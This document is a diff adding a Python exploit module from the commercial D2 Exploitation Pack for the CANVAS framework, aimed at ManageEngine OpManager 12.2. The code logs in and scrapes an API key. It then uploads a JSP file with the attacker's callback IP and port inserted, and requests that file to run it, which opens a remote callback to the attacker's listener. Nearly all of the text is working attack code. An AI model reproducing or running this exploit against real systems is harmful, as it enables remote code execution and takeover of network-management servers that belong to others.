@@ -1,0 +1,154 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2017
+#
+
+import sys
+import time
+import os
+import random
+import re
+import urllib
+
+from urllib import urlopen
+from sgmllib import SGMLParser
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+import libs.spkproxy as spkproxy
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+
+# GUI info
+NAME = "ManageEngine OpManager Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote code execution vulnerability in ManageEngine OpManager"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "ManageEngine"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Versions Affected"] = "ManageEngine OpManager 12.2"
+DOCUMENTATION["Date public"] = "2017.06.16"
+DOCUMENTATION["References"] = "https://blogs.securiteam.com/index.php/archives/3228"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = '1.0'
+
+GTK2_DIALOG = 'dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+
+NOTES="""
+Start converttomosdef to get a MOSDEF node from the JAVA node.
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.host = ""    
+    self.filename = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_opmanager2/d2.jsp"    
+    self.protocol = "http"
+    self.port = 8060
+    self.username = ""
+    self.password = ""                    
+    self.name = NAME
+    return
+
+  def neededListenerTypes(self):
+    return [canvasengine.JAVASERVER]
+	
+  def upload_file(self):               
+    # Open JSP file
+    f = open(self.filename, "r")
+    fdata = f.read()
+    f.close()
+    
+    fdata = fdata.replace("CALLBACK_IP", self.callback.ip)
+    fdata = fdata.replace("CALLBACK_PORT", str(self.callback.port))    
+    
+    ua = spkproxy.UserAgent("", exploit=self)
+
+    # Authentication
+    url = '/'        
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+    data = ua.GET(mainurl)
+
+    url = '/j_security_check'        
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+    params = urllib.urlencode({'AUTHRULE_NAME':'Authenticator', 'clienttype':'html', 'ScreenWidth':'1920', 'ScreenHeight':'932', 'loginFromCookieData':'', 'ntlmv2':'false', 'j_username':self.username, 'j_password':self.password, 'signInAutomatically':'on', 'uname':''})
+    data = ua.POST(mainurl, params)
+
+    # Get apiKey
+    url = '/'        
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+    data = ua.GET(mainurl)
+    
+    url = '/apiclient/ember/index.jsp'        
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+    data = ua.GET(mainurl)
+    m = re.search('window.OPM.apiKey = "([^\"]+)";', data)
+    if m is None:
+        self.log("[D2SEC] - apiKey not found")
+        return 0
+                
+    # Upload JSP file            
+    params = '-----------------880735062871553\r\nContent-Disposition: form-data; name="post"\r\n\r\nd2\r\n-----------------880735062871553\r\nContent-Disposition: form-data; name="[object HTMLInputElement]i"; filename="d2.jsp"\r\nContent-Type: text/plain\r\nContent-Length: %d\r\n\r\n%s\r\n-----------------880735062871553--\r\n'%(len(fdata), fdata)      
+    url = '/api/json/dashboard/addPost?apiKey=%s&groupID=0'%m.group(1)        
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+    ua.addHeader("Content-Type", "multipart/form-data; boundary=---------------880735062871553") 
+    data = ua.POST(mainurl, params)
+    m = re.search('"post_id":"([^\"]+)"', data)
+    if m is None:
+        self.log("[D2SEC] - post_id not found")
+        return 0
+        	
+    # Execute uploaded JSP file
+    url = "/itplus/FileStorage/%s/d2.jsp"%m.group(1)
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+    data = ua.GET(mainurl)    
+                		
+    return 1
+
+  def getargs(self):	
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port", self.port))
+    self.username = self.argsDict.get("username", self.username)
+    self.password = self.argsDict.get("password", self.password)     
+
+  def run(self):
+    self.getargs()
+    self.setInfo("%s attacking %s"%(NAME,self.host))
+ 
+    ret = self.upload_file()
+    
+    self.setInfo("%s attacking %s - done"%(NAME, self.host))
+    
+    return ret
+
+  def usage(self):
+    print "Usage: " + sys.argv[0] + " -t target -p port -O https:[0|1]"
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
